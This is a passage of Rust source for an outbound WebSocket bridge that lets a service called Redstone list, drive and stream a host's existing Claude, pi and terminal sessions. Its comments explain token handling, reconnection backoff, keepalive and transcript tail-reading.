//! The Redstone bridge: an outbound WebSocket that lets Redstone drive this
//! host's Claude sessions.
//!
//! Started by `rmux-agent bridge`, and enrolled by rmux writing
//! [`rmux_bridge::Enrolment`] to `~/.rmux/redstone.json`. See that crate for the
//! wire contract and for why the bridge lives on the host rather than in the
//! desktop app.
//!
//! ## It dials out, and it never listens
//!
//! There is no bound port anywhere in this file. A dev box behind NAT, a laptop
//! on hotel wifi and a VPC with no ingress at all are all reachable this way,
//! and none of them needs a firewall change, a public address or a certificate.
//!
//! ## Everything it can do drives a session the operator opened
//!
//! The verbs are a closed set: list what is running, drive a Claude conversation,
//! read a transcript, and — against a terminal the operator already opened —
//! read its output, type into it, and stream it live. **No verb creates a shell
//! from nothing**: the only session a remote caller can start is a Claude one,
//! which runs under its permission prompts. Terminal access is real command
//! execution and is deliberately bounded to existing sessions; the full
//! reasoning, and the line that must not move, is in `rmux_bridge::protocol`.
//!
//! ## Reconnection is expected, not exceptional
//!
//! A host outlives any number of Redstone deploys, network partitions and laptop
//! lids. The loop below backs off and retries forever rather than exiting,
//! because a bridge that gives up is a host that silently stops answering — and
//! nothing on either side would say why.

use std::time::Duration;

use std::collections::HashMap;

use base64::Engine as _;
use futures::{SinkExt, StreamExt};
use rmux_bridge::protocol::{
    Agent, Conversation, ErrorCode, Event, Frame, Hello, HostInfo, Kind, Message, Request,
    Response, Role, Session, Status, VERSION,
};
use rmux_bridge::Enrolment;
use rmux_claude_core::{keys, launch, pi, sessions as claude_sessions, transcript};
use tokio_tungstenite::tungstenite;

use crate::attach::StreamEvent;
use crate::{alias, attach, status};

/// How long to wait before redialling, and the ceiling on that wait.
///
/// Capped rather than unbounded: a host that has been disconnected overnight must
/// come back within a minute of the far side returning, not within however long
/// the backoff had grown to. The floor is a second, because a Redstone restart
/// drops every bridge at once and an instant stampede is how a fleet turns one
/// deploy into an outage.
const REDIAL_MIN: Duration = Duration::from_secs(1);
const REDIAL_MAX: Duration = Duration::from_secs(60);

/// How long a connection must last to count as having worked.
///
/// Only a connection that survives this resets the backoff. A socket that is
/// accepted and closed immediately — a refused token, a server mid-deploy — is
/// not evidence of health however politely it ended.
const HEALTHY: Duration = Duration::from_secs(30);

/// The close code Redstone sends for an unknown or revoked token (RFC 6455
/// "policy violation"). Named, because a bare 1008 in a match arm is the sort
/// of constant nobody can look up a year later.
const REJECTED: u16 = 1008;

/// How long a spawned session is given to appear before the caller is answered.
const SPAWN_SETTLE: Duration = Duration::from_millis(500);

/// How long a live connection may go without *any* inbound frame before it is
/// treated as dead and redialled.
///
/// This is the receive side of the keepalive, and the mirror of Redstone's own:
/// the server pings roughly every 20s, so a healthy connection always delivers a
/// frame (a ping if nothing else) well within this window. On a silent socket
/// death with no RST — a rotated IPv6 privacy address, a NAT box that forgot the
/// mapping — the read would otherwise block forever on a dead connection and
/// nothing would ever trigger the reconnect that only an OS-surfaced error does.
/// 50s is ~2.5 server pings of margin, so a single dropped ping does not redial a
/// live host.
const RECV_IDLE: Duration = Duration::from_secs(50);

/// Default tail for a transcript read. See `rmux-claude-core`: a real one has
/// been measured at 228 MB.
const DEFAULT_TAIL_BYTES: u64 = 256 * 1024;
/// Ceiling on what a caller may ask for, however large a number it sends.
const MAX_TAIL_BYTES: u64 = 8 * 1024 * 1024;

/// Terminal size for a session the bridge creates.
///
/// A remote caller has no window, so there is no honest answer — but Claude has
/// to be told something, and a session someone later opens in rmux is resized to
/// their real window the moment they attach. 120x40 is a reasonable shape for
/// the transcript that gets recorded in the meantime.
const SPAWN_COLS: u16 = 120;
const SPAWN_ROWS: u16 = 40;

/// Run the bridge until the process is stopped.
pub async fn run() -> anyhow::Result<()> {
    // **Installed once, here, and not left to chance.** `tokio-tungstenite`
    // pulls `rustls` with no crypto provider selected, so without this the first
    // `connect_async` to a `wss://` URL panics with "no process-level
    // CryptoProvider available" — which on a host, over ssh, reads as the bridge
    // simply dying on startup. `ring` is compiled in via the workspace manifest.
    let _ = rustls::crypto::ring::default_provider().install_default();

    let Some(enrolment) = Enrolment::load()? else {
        anyhow::bail!(
            "this host is not enrolled with Redstone \
             (no ~/.rmux/redstone.json) — enrol it from rmux"
        );
    };

    let mut backoff = REDIAL_MIN;
    loop {
        let started = std::time::Instant::now();
        let outcome = serve(&enrolment).await;
        let lasted = started.elapsed();

        backoff = next_backoff(&outcome, lasted, backoff);
        match &outcome {
            Ok(Some(REJECTED)) => tracing::warn!(
                retry_in = ?backoff,
                "Redstone rejected this host's token (policy close). It may have been \
                 revoked — re-enrol the host from rmux.",
            ),
            Ok(code) => tracing::info!(?code, ?lasted, retry_in = ?backoff, "bridge closed"),
            Err(e) => tracing::warn!(error = %e, ?lasted, retry_in = ?backoff, "bridge disconnected"),
        }

        tokio::time::sleep(backoff).await;
    }
}

/// How long to wait before redialling.
///
/// **A clean close is not evidence that anything worked**, and the first version
/// assumed it was: it reset the backoff on every `Ok`, reasoning that a clean
/// close is an ordinary disconnect. But a server that *rejects* the token also
/// closes cleanly — Redstone answers an unknown or revoked one with a 1008 — so
/// a revoked host would have redialled **every second, for ever**, against
/// somebody's production box. That is precisely the failure this file exists to
/// avoid, sitting in the retry loop.
///
/// What earns a reset is a connection that *lasted*, not one that ended
/// politely. That rule applies to the error path too: a socket that served for
/// an hour and then dropped should come back quickly, and a dial that fails
/// instantly should not.
fn next_backoff(
    outcome: &anyhow::Result<Option<u16>>,
    lasted: Duration,
    current: Duration,
) -> Duration {
    // Retrying a refused credential faster does not make it more acceptable; it
    // just generates failed authentications on someone else's server.
    if matches!(outcome, Ok(Some(code)) if *code == REJECTED) {
        return REDIAL_MAX;
    }
    if lasted >= HEALTHY {
        return REDIAL_MIN;
    }
    (current * 2).min(REDIAL_MAX)
}

/// One connection, from dial to close.
///
/// Returns the close code the far side sent, when it sent one. That is what
/// lets [`run`] tell "your token is no good" apart from "the server restarted",
/// which are the same event as far as the socket is concerned and want opposite
/// retry behaviour.
async fn serve(enrolment: &Enrolment) -> anyhow::Result<Option<u16>> {
    let request = tungstenite::client::IntoClientRequest::into_client_request(
        enrolment.endpoint.as_str(),
    )
    .map(|mut request| {
        // **The token goes here and nowhere else.** Not in the URL — a query
        // string lands in every proxy log and every browser history — and not in
        // a frame, which would mean parsing input from anyone who can reach the
        // endpoint before knowing who they are.
        request.headers_mut().insert(
            "authorization",
            tungstenite::http::HeaderValue::from_str(&format!("Bearer {}", enrolment.token))
                .unwrap_or_else(|_| tungstenite::http::HeaderValue::from_static("")),
        );
        request
    })?;

    let (socket, _) = tokio_tungstenite::connect_async(request).await?;
    tracing::info!(endpoint = %enrolment.endpoint, "bridge connected");

    // **The sink is behind a single writer task.** Terminal streams push output
    // from their own tasks, so more than one place needs to write to the socket
    // — and a `SplitSink` is not `Sync` to share. Everything that goes out is a
    // `Message` on this channel; the writer drains it. This is also what makes
    // the keepalive correct: a queued pong that never flushes dies at the load
    // balancer's idle timeout, so pings are answered by pushing a pong *here*,
    // where the writer flushes it, rather than trusting the library to.
    let (mut sink, mut stream) = socket.split();
    let (out_tx, mut out_rx) = tokio::sync::mpsc::channel::<tungstenite::Message>(256);
    let writer = tokio::spawn(async move {
        while let Some(message) = out_rx.recv().await {
            if sink.send(message).await.is_err() {
                break;
            }
        }
    });

    // Greet first, unprompted. Redstone needs the agent's version to explain a
    // missing method by naming the release that has it.
    out_tx
        .send(tungstenite::Message::Text(
            serde_json::to_string(&Hello {
                protocol: VERSION,
                agent_version: crate::provision::VERSION.to_owned(),
                host: host_info(),
            })?
            .into(),
        ))
        .await
        .ok();

    // Live terminal attachments: session name → a control channel to its pump.
    // Only the read loop touches this, so a plain map needs no lock. Dropping the
    // sender detaches the terminal (the pump's `recv` returns `None`).
    let mut terminals: HashMap<String, tokio::sync::mpsc::Sender<TerminalCtrl>> = HashMap::new();

    let close_code = loop {
        // **Only the inbound read is watched** — the writer task owns the sink
        // and flushes pongs on its own, so nothing here touches it. A fresh
        // `timeout` per await means every frame received resets the window.
        let next = match tokio::time::timeout(RECV_IDLE, stream.next()).await {
            Ok(next) => next,
            // No frame within the window. Redstone pings every ~20s, so this is a
            // silently dead socket. Break out the same way a read error or a
            // stream-end does, so the reconnect-with-backoff loop in `run`
            // redials — `next_backoff` treats it like any other drop, resetting
            // to the floor when the connection had lasted ≥ HEALTHY.
            Err(_elapsed) => {
                tracing::warn!(
                    idle = ?RECV_IDLE,
                    "no frame within the receive-idle window; treating the connection as dead",
                );
                break None;
            }
        };
        let Some(message) = next else { break None };
        match message? {
            tungstenite::Message::Text(text) => {
                let parsed = serde_json::from_str::<Frame>(&text);
                match parsed {
                    // A control verb for a live terminal is handled here rather
                    // than in `dispatch`, because it needs the attachment map and
                    // the outbound channel that streaming owns.
                    Ok(Frame::Request { id, request })
                        if is_terminal_stream_verb(&request) =>
                    {
                        let response =
                            handle_terminal_stream(request, &mut terminals, &out_tx).await;
                        send_response(&out_tx, id, response).await;
                    }
                    Ok(Frame::Request { id, request }) => {
                        let response = dispatch(request).await;
                        send_response(&out_tx, id, response).await;
                    }
                    // Responses and events flow the other way. Redstone sending
                    // one is a bug on its side, not something to act on.
                    Ok(_) => {}
                    // **Answered, not dropped.** A method this build does not know
                    // must get an `unsupported` reply, or the caller hangs until
                    // it times out — indistinguishable from a dead host, and a
                    // newer Redstone against an older agent is the ordinary case.
                    Err(e) => {
                        let value = serde_json::from_str::<serde_json::Value>(&text).ok();
                        let Some(id) =
                            value.as_ref().and_then(|v| v.get("id")).and_then(serde_json::Value::as_u64)
                        else {
                            tracing::debug!(%text, "unparseable frame with no id to answer");
                            continue;
                        };
                        let method = value
                            .and_then(|v| v.get("method").and_then(|m| m.as_str()).map(str::to_owned))
                            .unwrap_or_else(|| "that request".to_owned());
                        tracing::debug!(%text, error = %e, "unsupported request");
                        send_response(
                            &out_tx,
                            id,
                            Response::Error {
                                code: ErrorCode::Unsupported,
                                message: format!(
                                    "this agent ({}) does not support {method}",
                                    crate::provision::VERSION
                                ),
                            },
                        )
                        .await;
                    }
                }
            }
            // Answered here rather than left to the library: with a split sink the
            // automatic pong is queued but never flushed, and an unflushed pong is
            // a connection the load balancer drops. Pushing it through the writer
            // flushes it.
            tungstenite::Message::Ping(payload) => {
                out_tx.send(tungstenite::Message::Pong(payload)).await.ok();
            }
            tungstenite::Message::Pong(_) => {}
            tungstenite::Message::Close(frame) => break frame.map(|f| u16::from(f.code)),
            tungstenite::Message::Binary(_) | tungstenite::Message::Frame(_) => {}
        }
    };

    // Returning drops `terminals` (detaching every live view) and `out_tx` (which
    // ends the writer task and closes the sink).
    drop(terminals);
    drop(out_tx);
    let _ = writer.await;
    Ok(close_code)
}

/// Control messages for a live terminal's pump task.
enum TerminalCtrl {
    Input(Vec<u8>),
    Resize(u16, u16),
}

fn is_terminal_stream_verb(request: &Request) -> bool {
    matches!(
        request,
        Request::AttachTerminal { .. }
            | Request::TerminalInput { .. }
            | Request::ResizeTerminal { .. }
            | Request::DetachTerminal { .. }
    )
}

async fn send_response(
    out_tx: &tokio::sync::mpsc::Sender<tungstenite::Message>,
    id: u64,
    response: Response,
) {
    if let Ok(text) = serde_json::to_string(&Frame::Response { id, response }) {
        out_tx.send(tungstenite::Message::Text(text.into())).await.ok();
    }
}

/// The four live-terminal verbs, which need the attachment map streaming owns.
async fn handle_terminal_stream(
    request: Request,
    terminals: &mut HashMap<String, tokio::sync::mpsc::Sender<TerminalCtrl>>,
    out_tx: &tokio::sync::mpsc::Sender<tungstenite::Message>,
) -> Response {
    match request {
        Request::AttachTerminal { session, cols, rows } => {
            // Re-attaching over an existing attachment replaces it, so the old
            // pump is dropped and its terminal detached first.
            terminals.remove(&session);

            match attach::open_terminal_stream(&session, cols, rows).await {
                Ok(Some(mut term)) => {
                    let (ctrl_tx, mut ctrl_rx) = tokio::sync::mpsc::channel::<TerminalCtrl>(64);
                    terminals.insert(session.clone(), ctrl_tx);

                    let out = out_tx.clone();
                    let sess = session.clone();
                    tokio::spawn(async move {
                        loop {
                            tokio::select! {
                                event = term.next() => match event {
                                    Some(StreamEvent::Output(bytes)) => {
                                        let data =
                                            base64::engine::general_purpose::STANDARD.encode(&bytes);
                                        let frame = Frame::Event(Event::TerminalOutput {
                                            session: sess.clone(),
                                            data,
                                        });
                                        match serde_json::to_string(&frame) {
                                            Ok(text) => {
                                                if out
                                                    .send(tungstenite::Message::Text(text.into()))
                                                    .await
                                                    .is_err()
                                                {
                                                    break;
                                                }
                                            }
                                            Err(_) => break,
                                        }
                                    }
                                    Some(StreamEvent::Exited(code)) => {
                                        let frame = Frame::Event(Event::TerminalExited {
                                            session: sess.clone(),
                                            code,
                                        });
                                        if let Ok(text) = serde_json::to_string(&frame) {
                                            out.send(tungstenite::Message::Text(text.into()))
                                                .await
                                                .ok();
                                        }
                                        break;
                                    }
                                    None => break,
                                },
                                ctrl = ctrl_rx.recv() => match ctrl {
                                    Some(TerminalCtrl::Input(data)) => { term.input(data).await; }
                                    Some(TerminalCtrl::Resize(c, r)) => { term.resize(c, r).await; }
                                    // The map entry was dropped — detach.
                                    None => break,
                                },
                            }
                        }
                        // `term` drops here, which detaches from the daemon.
                    });

                    Response::TerminalAttached { session }
                }
                Ok(None) => not_found(&session),
                Err(e) => failed(e),
            }
        }

        Request::TerminalInput { session, data } => {
            let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(data.as_bytes())
            else {
                return refused("terminal input must be base64");
            };
            match terminals.get(&session) {
                Some(ctrl) if ctrl.send(TerminalCtrl::Input(bytes)).await.is_ok() => Response::Ok,
                // No live attachment (or its pump has ended). The caller must
                // attach before it can type.
                _ => not_attached(&session),
            }
        }

        Request::ResizeTerminal { session, cols, rows } => match terminals.get(&session) {
            Some(ctrl) if ctrl.send(TerminalCtrl::Resize(cols, rows)).await.is_ok() => Response::Ok,
            _ => not_attached(&session),
        },

        Request::DetachTerminal { session } => {
            // Dropping the control sender ends the pump, which drops the stream
            // and detaches. The session keeps running — detach is not close.
            match terminals.remove(&session) {
                Some(_) => Response::Ok,
                None => not_attached(&session),
            }
        }

        // `is_terminal_stream_verb` gates this function, so nothing else arrives.
        other => failed(format!("not a terminal-stream verb: {other:?}")),
    }
}

fn not_attached(session: &str) -> Response {
    Response::Error {
        code: ErrorCode::NotFound,
        message: format!("no live terminal attachment for {session}; attach first"),
    }
}

/// Answer one request.
async fn dispatch(request: Request) -> Response {
    match request {
        Request::HostInfo => Response::Host { host: host_info() },

        Request::ListSessions => match live_sessions().await {
            Ok(sessions) => Response::Sessions { sessions },
            Err(e) => failed(e),
        },

        Request::ListConversations { limit, folder, agent } => {
            let result = match agent {
                Agent::Claude => conversations(limit, folder.as_deref()).await,
                Agent::Pi => pi_conversations(limit, folder.as_deref()),
            };
            match result {
                Ok(conversations) => Response::Conversations { conversations },
                Err(e) => failed(e),
            }
        }

        Request::ReadConversation { conversation, max_bytes, agent } => {
            let result = match agent {
                Agent::Claude => read_conversation(&conversation, max_bytes),
                Agent::Pi => pi_read_conversation(&conversation, max_bytes),
            };
            match result {
                Ok((messages, truncated)) => Response::Conversation { messages, truncated },
                Err(e) => failed(e),
            }
        }

        Request::Send { session, message } => {
            if message.trim().is_empty() {
                return refused("a message with no text would submit an empty prompt");
            }
            // **The same two-write sequence the desktop app uses**, from the same
            // module. Appending the carriage return to the text makes the TUI
            // treat the whole thing as one bracketed paste and swallow it, so the
            // message sits in the composer, typed but never sent — which reads
            // from Redstone as "it accepted my message and did nothing".
            //
            // The encoder is chosen by the session-name prefix, the same signal
            // `live_sessions` and `Close` already trust — `Request::Send` carries
            // no `agent` field, and the host derives the agent from the name it
            // minted (`pi-…`/`claude-…`) rather than the wire re-stating it. Only
            // multi-line differs: Claude's `\\\r` line break is Claude's alone, so
            // pi gets a bracketed paste instead (see `keys::send_message_pi`).
            let chunks = if session.starts_with("pi-") {
                keys::send_message_pi(&message)
            } else {
                keys::send_message(&message)
            };
            for (i, chunk) in chunks.iter().enumerate() {
                if i > 0 {
                    tokio::time::sleep(keys::SUBMIT_SETTLE).await;
                }
                match attach::write(&session, chunk).await {
                    Ok(true) => {}
                    Ok(false) => return not_found(&session),
                    Err(e) => return failed(e),
                }
            }
            Response::Ok
        }

        Request::Interrupt { session } => match attach::write(&session, keys::interrupt()).await {
            Ok(true) => Response::Ok,
            Ok(false) => not_found(&session),
            Err(e) => failed(e),
        },

        // Handled in `serve` before `dispatch` is reached — see
        // `is_terminal_stream_verb`. Listed so the match stays exhaustive and a
        // new verb is a compile error rather than a silent drop.
        Request::AttachTerminal { .. }
        | Request::TerminalInput { .. }
        | Request::ResizeTerminal { .. }
        | Request::DetachTerminal { .. } => {
            failed("terminal-stream verb reached dispatch")
        }

        Request::Close { session } => {
            // Looked up first so a name nobody holds is `notFound` rather than a
            // cheerful `ok`. `kill` is deliberately idempotent and silent, which
            // is right for closing a tab and wrong for answering a caller.
            match attach::list().await {
                Ok(all) if !all.iter().any(|s| s.name == session) => not_found(&session),
                _ => match attach::kill(&session).await {
                    Ok(()) => Response::Ok,
                    Err(e) => failed(e),
                },
            }
        }

        Request::ReadTerminal { session, max_bytes } => {
            match attach::read(&session).await {
                Ok(Some(bytes)) => {
                    let tail = max_bytes.unwrap_or(DEFAULT_TAIL_BYTES).clamp(1, MAX_TAIL_BYTES) as usize;
                    let truncated = bytes.len() > tail;
                    let slice = if truncated { &bytes[bytes.len() - tail..] } else { &bytes[..] };
                    Response::Terminal { output: readable(slice), truncated }
                }
                Ok(None) => not_found(&session),
                Err(e) => failed(e),
            }
        }

        Request::SendTerminal { session, input, submit } => {
            // A terminal takes raw bytes and a carriage return to run. This is the
            // verb the module note calls out: it types into a shell the operator
            // opened, exactly as if they were at the keyboard, and `submit` is
            // what makes it *run*. Bounded to a session that already exists —
            // `attach::write` never creates one.
            let mut bytes = input.into_bytes();
            if submit {
                bytes.push(b'\r');
            }
            match attach::write(&session, &bytes).await {
                Ok(true) => Response::Ok,
                Ok(false) => not_found(&session),
                Err(e) => failed(e),
            }
        }

        Request::Spawn { folder, prompt, name, model_profile, agent } => {
            match spawn(agent, &folder, prompt.as_deref(), name.as_deref(), model_profile.as_deref())
                .await
            {
                Ok(session) => Response::Spawned { session },
                Err(e) => failed(e),
            }
        }
    }
}

fn failed(e: impl std::fmt::Display) -> Response {
    Response::Error { code: ErrorCode::Failed, message: e.to_string() }
}

fn refused(message: &str) -> Response {
    Response::Error { code: ErrorCode::Refused, message: message.to_owned() }
}

/// Turn a raw terminal buffer into legible text.
///
/// Best-effort, and honest about being so: the daemon stores exactly what the
/// shell wrote, escape sequences and all, and there is no emulator on this side
/// to render it (the agent cannot carry `alacritty_terminal`). So this strips the
/// commonest control sequences — CSI, OSC, and the single-character escapes — so
/// an agent reading command output gets words rather than `\x1b[0m` noise. It is
/// not a terminal; anything that needs the real screen attaches and renders the
/// raw stream instead.
fn readable(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\u{1b}' {
            // Drop the other C0 control codes except tab and newline, which carry
            // layout a reader wants.
            if ch == '\t' || ch == '\n' || !ch.is_control() {
                out.push(ch);
            }
            continue;
        }
        match chars.peek() {
            // CSI: ESC [ ... final byte in 0x40..=0x7e
            Some('[') => {
                chars.next();
                for c in chars.by_ref() {
                    if ('\u{40}'..='\u{7e}').contains(&c) {
                        break;
                    }
                }
            }
            // OSC: ESC ] ... terminated by BEL or ESC \
            Some(']') => {
                chars.next();
                while let Some(c) = chars.next() {
                    if c == '\u{7}' {
                        break;
                    }
                    if c == '\u{1b}' {
                        if chars.peek() == Some(&'\\') {
                            chars.next();
                        }
                        break;
                    }
                }
            }
            // Any other escape: drop ESC and the one byte that follows.
            Some(_) => {
                chars.next();
            }
            None => {}
        }
    }
    out
}

fn not_found(session: &str) -> Response {
    Response::Error {
        code: ErrorCode::NotFound,
        // Named, and with the likely cause, because a remote caller works from a
        // list it fetched some time ago and this is the routine outcome.
        message: format!("no session called {session} on this host; it may have ended"),
    }
}

/// This machine.
fn host_info() -> HostInfo {
    HostInfo {
        hostname: hostname(),
        // The account the agent runs as — the ceiling on everything the bridge
        // can do, so it is reported rather than left for anyone to assume.
        user: std::env::var("USER").or_else(|_| std::env::var("LOGNAME")).unwrap_or_default(),
        os: std::env::consts::OS.to_owned(),
        home: dirs::home_dir().map(|h| h.to_string_lossy().into_owned()),
    }
}

fn hostname() -> String {
    // **`gethostname`, not `/proc/sys/kernel/hostname`.** The first version read
    // procfs, which is correct on the Linux hosts the agent is usually installed
    // on and simply absent on macOS — where the agent also runs, for local
    // sessions. Measured against a real bridge: every macOS host reported
    // `"unknown"`, which is the name an operator would then see in Redstone's
    // host list for their own laptop.
    //
    // `$HOSTNAME` is not a fallback worth having: a login shell sets it and a
    // daemon started by ssh frequently has no such variable, so it would be
    // empty exactly when it was needed.
    #[cfg(unix)]
    {
        let mut buf = vec![0u8; 256];
        // SAFETY: `buf` is a valid writable allocation of `buf.len()` bytes, and
        // `gethostname` writes at most that many.
        let rc = unsafe { libc::gethostname(buf.as_mut_ptr() as *mut libc::c_char, buf.len()) };
        if rc == 0 {
            // Truncation leaves the buffer unterminated on some platforms, so the
            // NUL is found rather than assumed.
            let end = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
            let name = String::from_utf8_lossy(&buf[..end]).trim().to_owned();
            if !name.is_empty() {
                return name;
            }
        }
    }
    std::env::var("HOSTNAME").ok().filter(|s| !s.is_empty()).unwrap_or_else(|| "unknown".to_owned())
}

/// Everything running on this host, with the status Claude reports for it.
///
/// Three sources, joined here because no one of them is complete: the daemons
/// know what shells exist, `~/.rmux/aliases.json` knows what the operator calls
/// them, and Claude's own session files know what each one is *doing*.
async fn live_sessions() -> anyhow::Result<Vec<Session>> {
    let summaries = attach::list().await?;
    let aliases = alias::load();
    let statuses = status::snapshot();

    Ok(summaries
        .into_iter()
        .map(|s| {
            let kind = if s.name.starts_with("claude-") {
                Kind::Claude
            } else if s.name.starts_with("pi-") {
                Kind::Pi
            } else {
                Kind::Shell
            };

            // Matched on pid, which is the only field both sides agree on: the
            // daemon knows the shell's pid, and Claude records its own. Matching
            // on cwd would collapse two conversations in one checkout into one.
            let live = statuses.iter().find(|st| st.pid.is_some() && st.pid == s.pid);

            Session {
                title: aliases.get(&s.name).cloned(),
                kind,
                folder: live.and_then(|l| l.cwd.clone()),
                conversation_id: live.map(|l| l.session_id.clone()),
                status: live.map(|l| parse_status(&l.status)).unwrap_or(Status::Unknown),
                pid: s.pid,
                age_seconds: s.age_seconds,
                attached: s.attached,
                name: s.name,
            }
        })
        .collect())
}

/// Claude's vocabulary, carried through unchanged.
fn parse_status(raw: &str) -> Status {
    match raw {
        "busy" => Status::Busy,
        "waiting" => Status::Waiting,
        "idle" => Status::Idle,
        "shell" => Status::Shell,
        // A status this build has never heard of is `Unknown`, never a guess.
        // Claude adds them, and mapping an unrecognised one onto `Idle` would
        // report a working session as finished.
        _ => Status::Unknown,
    }
}

/// Every conversation recorded on this host.
///
/// Runs `rmux-claude-core`'s own listing script locally — the same script the
/// desktop app runs over ssh, so the two cannot disagree about which
/// conversations exist or where Claude keeps them. That matters more than it
/// sounds: **Claude's project-directory scheme is not computable**, it changed
/// between versions, and the script is where every spelling is tried.
async fn conversations(
    limit: Option<u32>,
    folder: Option<&str>,
) -> anyhow::Result<Vec<Conversation>> {
    let out = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(claude_sessions::list_all_sessions_script())
        .output()
        .await?;

    let running = status::snapshot();
    let mut all: Vec<Conversation> = claude_sessions::parse_all_sessions(&out.stdout)
        .into_iter()
        .map(|info| Conversation {
            running: running.iter().any(|r| r.session_id == info.id),
            id: info.id,
            folder: info.folder,
            summary: info.title,
            // **Seconds here, milliseconds on the wire.** The listing script
            // reports `mtime` in whole seconds while Claude's own status files
            // are in milliseconds, and one protocol carrying both units is how a
            // timestamp ends up 1000× wrong in somebody's UI. Everything in
            // `rmux-bridge` is milliseconds; the conversion belongs here, once.
            modified: Some(info.modified.saturating_mul(1000)),
            // The listing does not report a size, and inventing one would be
            // worse than admitting it: a caller sizing a read off a guess would
            // ask for the wrong tail.
            size: None,
        })
        .collect();

    if let Some(folder) = folder {
        let folder = folder.trim_end_matches('/');
        all.retain(|c| {
            c.folder.as_deref().is_some_and(|f| {
                let f = f.trim_end_matches('/');
                // Prefix match on a *path boundary*, so `/srv/api` does not also
                // return `/srv/api-staging`.
                f == folder || f.strip_prefix(folder).is_some_and(|rest| rest.starts_with('/'))
            })
        });
    }

    // Newest first, then bounded. A host in use for a year holds thousands, and
    // an unbounded answer is one nobody can render — but truncating before
    // sorting would return an arbitrary thousand rather than the newest.
    all.sort_by_key(|c| std::cmp::Reverse(c.modified.unwrap_or(0)));
    if let Some(limit) = limit {
        all.truncate(limit as usize);
    }
    Ok(all)
}

/// Read the tail of a `.jsonl` transcript, always including the *last complete
/// record* even when it is larger than `tail`.
///
/// Returns `(bytes, size, truncated)` ready for `transcript::parse_body` /
/// `pi::parse`. Both the Claude and pi read paths call this, so the walk-back
/// lives in one place and the two cannot drift.
///
/// The bug this closes: a naive `seek(size - tail)` lands *inside* the last
/// record when `tail` is smaller than that record. After `parse_body` drops the
/// leading partial line, nothing complete is left — a non-empty file returns
/// `{"messages":[],"truncated":true}`, byte-identical to a broken parser. That
/// cost a day of debugging once already, so the guarantee here is absolute:
/// **a non-empty file never yields zero records.** A small cap may *under*-deliver
/// (fewer records than a larger cap), but never nothing.
///
/// The fix is a walk-back, not a clamp floor. A single record can exceed any
/// fixed cap, so the read is allowed to exceed `tail` when — and only when —
/// that is what it takes to include the last whole record. Still tail-bounded:
/// the walk only ever extends the window to the nearest record boundary, never
/// to the whole 228 MB file.
fn read_tail_including_last_record(
    path: &std::path::Path,
    tail: u64,
) -> std::io::Result<(Vec<u8>, u64, bool)> {
    use std::io::{Read, Seek, SeekFrom};

    let mut file = std::fs::File::open(path)?;
    let size = file.metadata()?.len();

    // Fits inside the cap: read it whole, nothing was dropped. `read_to_end`
    // copes if the file shrank since the metadata call — it reads what is there.
    if size <= tail {
        let mut buf = Vec::with_capacity(size as usize);
        file.read_to_end(&mut buf)?;
        return Ok((buf, size, false));
    }

    // The window the cap asks for, and the start of the last complete record.
    let desired_start = size - tail;
    let last_record_start = find_last_record_start(&mut file, size)?;

    // Never begin *after* the last record starts — that is exactly the case where
    // dropping the leading partial would leave nothing.
    let mut start = desired_start.min(last_record_start);

    // When the window begins on a clean record boundary above offset 0,
    // `parse_body`'s leading-partial-line drop would eat that whole first record.
    // Back up one byte to the newline that terminates the previous record, so the
    // drop removes an empty prefix instead and the record survives.
    if start == last_record_start && start > 0 {
        start -= 1;
    }

    file.seek(SeekFrom::Start(start))?;
    let mut buf = Vec::new();
    file.read_to_end(&mut buf)?;
    let truncated = start > 0;
    Ok((buf, size, truncated))
}

/// Byte offset of the start of the last complete record (the byte after the last
/// interior `\n`, ignoring a single trailing newline), or `0` if the whole file
/// is one record. Scans backward in chunks so a 228 MB transcript is not read
/// whole to find its final line.
fn find_last_record_start(file: &mut std::fs::File, size: u64) -> std::io::Result<u64> {
    use std::io::{Read, Seek, SeekFrom};

    if size == 0 {
        return Ok(0);
    }

    // Ignore a single trailing newline so the record it terminates is the "last".
    let mut last = [0u8; 1];
    file.seek(SeekFrom::Start(size - 1))?;
    let end = if file.read(&mut last)? == 1 && last[0] == b'\n' {
        size - 1
    } else {
        size
    };
    if end == 0 {
        return Ok(0); // the file was a lone "\n"
    }

    const CHUNK: usize = 64 * 1024;
    let mut buf = vec![0u8; CHUNK];
    let mut hi = end; // search the half-open region [0, hi)
    while hi > 0 {
        let lo = hi.saturating_sub(CHUNK as u64);
        let len = (hi - lo) as usize;
        file.seek(SeekFrom::Start(lo))?;
        file.read_exact(&mut buf[..len])?;
        if let Some(idx) = buf[..len].iter().rposition(|b| *b == b'\n') {
            return Ok(lo + idx as u64 + 1);
        }
        hi = lo;
    }
    Ok(0)
}

/// Read one conversation back, tail-bounded.
fn read_conversation(id: &str, max_bytes: Option<u64>) -> anyhow::Result<(Vec<Message>, bool)> {
    let path = find_transcript(id)?;
    read_transcript_at(id, &path, max_bytes)
}

/// Read and parse a Claude transcript at a known path, tail-bounded.
///
/// Split out from [`read_conversation`] so the read-and-parse can be tested
/// against a temp file without touching the operator's real `~/.claude`.
fn read_transcript_at(
    id: &str,
    path: &std::path::Path,
    max_bytes: Option<u64>,
) -> anyhow::Result<(Vec<Message>, bool)> {
    let tail = max_bytes.unwrap_or(DEFAULT_TAIL_BYTES).clamp(1, MAX_TAIL_BYTES);

    // Tail-bounded, but always including the last complete record — a cap smaller
    // than the final record must still return it, not an empty list. The walk-back
    // lives in `read_tail_including_last_record`, shared with the pi path.
    let (bytes, size, truncated) = read_tail_including_last_record(path, tail)?;

    // A raw `.jsonl` has no `id\0size\0` header — that framing is emitted only by
    // the SSH tail-script `transcript::parse` expects. Feeding these bytes to
    // `parse` would make `split_output` return `None` and yield an empty
    // transcript (the shipped bug). The id and size are already known here, so the
    // body is parsed directly. `truncated` is passed through so the parser drops
    // the leading partial line; getting it wrong the other way — claiming a
    // complete read — silently discards the first message of a short conversation.
    let parsed = transcript::parse_body(id.to_owned(), size, &bytes, truncated);

    Ok((
        parsed
            .entries
            .into_iter()
            .map(|e| Message {
                role: match e.speaker {
                    transcript::Speaker::User => Role::User,
                    transcript::Speaker::Assistant => Role::Assistant,
                    transcript::Speaker::Tool => Role::Tool,
                    // Slash-command plumbing, caveat banners and system reminders
                    // are recorded by Claude as *user* messages and dominate the
                    // tail of a long session; the parser has already demoted them
                    // to `System`, so a reader can drop them without knowing the
